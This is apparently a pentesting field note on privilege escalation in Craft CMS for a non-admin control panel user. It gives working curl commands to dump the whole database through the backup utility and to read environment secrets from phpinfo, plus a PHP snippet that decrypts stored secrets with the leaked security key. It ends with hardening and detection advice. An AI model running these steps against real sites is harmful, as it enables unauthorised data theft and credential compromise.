---
topic: craft-cms
platform: Web
tags: [craftcms, yii2, php, secrets, web, privesc]
---

# Craft CMS — control panel utilities and environment secrets

[🇪🇸 Español](craft-cms-cp-utilities.md) | **English**

> You already have a control panel session but you are **not** an admin: what to check before burning hours on an RCE that does not apply.

## 1. Confirm the real role (not the one the writeup claims)

Craft injects its config into the CP HTML. Read it before assuming privileges:

```bash
curl -s -b cj http://<host>/admin/dashboard -o dash.html
grep -o '"userIsAdmin":[a-z]*' dash.html
grep -o '"publishableSections":\[[^]]*\]' dash.html
grep -o '"editableCategoryGroups":\[[^]]*\]' dash.html
grep -o '"canAccessQueueManager":[a-z]*' dash.html
```

If `userIsAdmin` is `false` and sections/assets are empty, forget publishing content: the interesting part is what the permission model **did not** close.

## 2. Enumerate utilities

```bash
for u in db-backup php-info system-report clear-caches updates queue-manager find-replace migrations; do
  printf '%-14s => ' "$u"
  curl -s -b cj -o /dev/null -w '%{http_code} %{size_download}\n' "http://<host>/admin/utilities/$u"
done
```

`200` with a large body = a real page (not a login redirect). It is common to find `db-backup` and `php-info` reachable when a role was created by copying "convenience" permissions.

## 3. Download the whole database

No exploit needed: the legitimate form already returns the dump if you ask for `downloadBackup`.

```bash
# 1) CSRF token from the CP itself
CSRF=$(sed -n 's/.*"csrfTokenValue":"\([^"]*\)".*/\1/p' db.html | head -1)

# 2) POST to the utility action
curl -s -b cj -c cj -o backup.zip \
  -H "X-CSRF-Token: $CSRF" -H 'X-Requested-With: XMLHttpRequest' \
  -H 'Accept: application/json' \
  --data-urlencode "CRAFT_CSRF_TOKEN=$CSRF" \
  --data-urlencode 'downloadBackup=1' \
  'http://<host>/index.php?p=admin/actions/utilities/db-backup-perform-action'

file backup.zip     # Zip archive -> <site>--<date>--v<version>.sql
```

If the host has no `unzip`:

```bash
python3 -c "import zipfile;zipfile.ZipFile('backup.zip').extractall('dbdump')"
```

## 4. `php-info` = `.env` in cleartext

Craft loads `.env` through Dotenv and `phpinfo()` prints the "Environment" section:

```bash
curl -s -b cj http://<host>/admin/utilities/php-info -o php.html
grep -oE 'CRAFT_[A-Z_]+' php.html | sort -u
```

Typically: `CRAFT_SECURITY_KEY`, `CRAFT_DB_USER`, `CRAFT_DB_PASSWORD`, `CRAFT_DB_DATABASE`, `CRAFT_DEV_MODE`, `CRAFT_ENABLE_TWIG_SANDBOX`. Parsing matters: in phpinfo each value sits in its own `<td>`, so take the `<td>` that follows the name.

## 5. Decrypting secrets stored in the database

Craft/Yii encrypt values with the security key. The blob follows `yii\base\Security::encryptByKey()`:

```text
[keySalt (keySize bytes)] [64-char hex MAC] [IV (16)] [AES-CBC ciphertext]
```

With access to the project `vendor/` tree (or by replicating the algorithm elsewhere):

```php
require 'vendor/autoload.php';

$security = new yii\base\Security();              // default cipher: AES-128-CBC
echo $security->decryptByKey(base64_decode($argv[1]), $argv[2]), PHP_EOL;
```

```bash
php dec.php '<blob_base64>' '<CRAFT_SECURITY_KEY>'
```

Field notes:

- `keySize` follows the cipher: 16 for AES-128-CBC (the default), 32 for AES-256-CBC. That decides where the MAC starts.
- The MAC is **hex**, not binary, because `hashData()` runs with `$rawHash = false`. That is why 64 ASCII characters sit inside an otherwise binary blob.
- If the MAC does not validate in your own reimplementation, do not keep guessing: test the value against the real service or get PHP execution on the host. A decryption that "looks right" but does not authenticate is not proof.
- Rotating the key invalidates older blobs: a value that will not decrypt may have been encrypted with a previous key.

## 6. Where the next hop usually hides

```bash
grep -rIl "password\|secret\|encrypt\|decryptByKey" /var/www/<app>/modules /var/www/<app>/src 2>/dev/null
```

Custom modules are the ones storing service credentials (SMTP, APIs, relays) in their own tables and decrypting them with the same key. That is where password reuse shows up.

## 7. Hardening

| Measure | Why |
|---|---|
| Real permissions on `utilities/*` | An editor must not generate or download backups |
| Disable the `php-info` utility in production | No reason to expose the environment |
| `expose_php = Off` and no reachable `phpinfo()` | Removes the `.env` leak |
| Keep the security key out of the web user's reach | Breaks the key/ciphertext separation |
| Rotate keys after exposure | Old blobs stop being useful |
| Never reuse service passwords as system passwords | Turns an app leak into host access |
| Encrypted backups with automatic purge | Limits impact if downloaded |

## 8. Detection

- POSTs to `admin/actions/utilities/db-backup-perform-action` from non-admin accounts.
- GETs to `utilities/php-info` in production (it should not exist).
- Backup downloads outside a maintenance window.
- Access to `vendor/` or PHP being run from temporary paths on the web host.

## References

- Craft CMS — Configuration and `.env`: <https://craftcms.com/docs/5.x/configure.html>
- Yii2 `yii\base\Security` (`encryptByKey`, `decryptByKey`, `hkdf`)
- CVE-2026-28695 / CVE-2026-44011 advisory family (behavior injection via `element-search`)
